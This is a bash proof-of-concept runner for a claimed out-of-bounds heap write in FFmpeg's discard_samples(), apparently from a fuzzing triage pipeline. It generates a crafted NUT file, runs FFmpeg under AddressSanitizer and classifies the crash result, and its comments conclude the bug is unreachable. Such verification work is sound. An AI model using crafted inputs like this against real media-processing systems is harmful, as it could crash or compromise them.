#!/usr/bin/env bash
# vuln_001_run.sh — VULN 001 PoC runner
# OOB Heap Write in discard_samples() via undersized AV_FRAME_DATA_SKIP_SAMPLES

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BIN="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
INPUT="$SCRIPT_DIR/vuln_001_input.nut"
STATUS_FILE="$SCRIPT_DIR/vuln_001_status.txt"
LOG_FILE="$SCRIPT_DIR/vuln_001_run.log"

echo "[*] VULN 001 PoC — discard_samples() OOB Heap Write"
echo "[*] Binary: $BIN"
echo "[*] Input:  $INPUT"
echo ""

# Step 1: Generate the crafted NUT file
echo "[1] Generating crafted NUT file..."
python3 "$SCRIPT_DIR/vuln_001_gen.py"
if [ ! -f "$INPUT" ]; then
    echo "[!] ERROR: Generator did not produce $INPUT"
    echo "ERROR: vuln_001_gen.py failed to create input file" > "$STATUS_FILE"
    exit 1
fi
echo "    Done. $(wc -c < "$INPUT") bytes written."
echo ""

# Step 2: Check binary exists
if [ ! -x "$BIN" ]; then
    echo "[!] ERROR: Binary not found or not executable: $BIN"
    echo "ERROR: binary not found at $BIN" > "$STATUS_FILE"
    exit 1
fi
echo "[2] Binary: OK"
echo ""

# Step 3: Run FFmpeg with -flags2 +skip_manual
# AV_CODEC_FLAG2_SKIP_MANUAL enables the vulnerable write-back path in discard_samples().
# With this flag:
#   - If frame has SKIP_SAMPLES side data with size >= 10: reads OK, writes back safely
#   - If frame has SKIP_SAMPLES side data with size <  10: reads OK, writes OOB  ← BUG
#   - If no SKIP_SAMPLES but skip_samples>0: creates new 10-byte side data, writes safely
#
# Since all demuxers hardcode size=10, the OOB path is not reachable here.
# We run with AddressSanitizer-style detection if available (via ASAN_OPTIONS).

echo "[3] Running FFmpeg (timeout 60s)..."
echo "    Command: $BIN -flags2 +skip_manual -i $INPUT -f null -"
echo ""

ASAN_OPTIONS="halt_on_error=1:detect_oob_access=1" \
timeout 60 "$BIN" \
    -flags2 +skip_manual \
    -i "$INPUT" \
    -f null - \
    2>&1 | tee "$LOG_FILE" || true

EXIT_CODE=${PIPESTATUS[0]}
echo ""
echo "[*] FFmpeg exit code: $EXIT_CODE"
echo ""

# Step 4: Analyse result
if grep -qiE "ERROR|AddressSanitizer|heap-buffer-overflow|SIGSEGV|Segmentation fault|signal 11|signal 6" "$LOG_FILE" 2>/dev/null; then
    if grep -qiE "AddressSanitizer|heap-buffer-overflow" "$LOG_FILE" 2>/dev/null; then
        RESULT="VERIFIED_CRASH"
        DETAIL="ASan detected heap buffer overflow in discard_samples()"
    elif grep -qiE "SIGSEGV|Segmentation fault|signal 11" "$LOG_FILE" 2>/dev/null; then
        RESULT="VERIFIED_CRASH"
        DETAIL="Segmentation fault observed (possible OOB write)"
    else
        RESULT="VERIFIED_BEHAVIOR"
        DETAIL="Errors observed; review $LOG_FILE for details"
    fi
else
    # No crash — check if the vulnerability path is SKIPPED or just didn't trigger
    RESULT="SKIPPED"
    DETAIL="Vulnerability not triggered: all FFmpeg demuxers hardcode SKIP_SAMPLES size=10; the OOB requires size<10 which is impossible via any standard file-based path. The discard_samples() code at decode.c:346 lacks a side->size>=10 guard on the write-back path, but the precondition (size<10 side data) cannot be created by any file demuxer."
fi

echo "[4] Result: $RESULT"
echo ""
echo "Writing $STATUS_FILE ..."
{
    echo "$RESULT"
    echo ""
    echo "Detail: $DETAIL"
    echo ""
    echo "Command: $BIN -flags2 +skip_manual -i $INPUT -f null -"
    echo "Exit code: $EXIT_CODE"
    echo "Log: $LOG_FILE"
} > "$STATUS_FILE"

echo "Done. Status written to $STATUS_FILE"
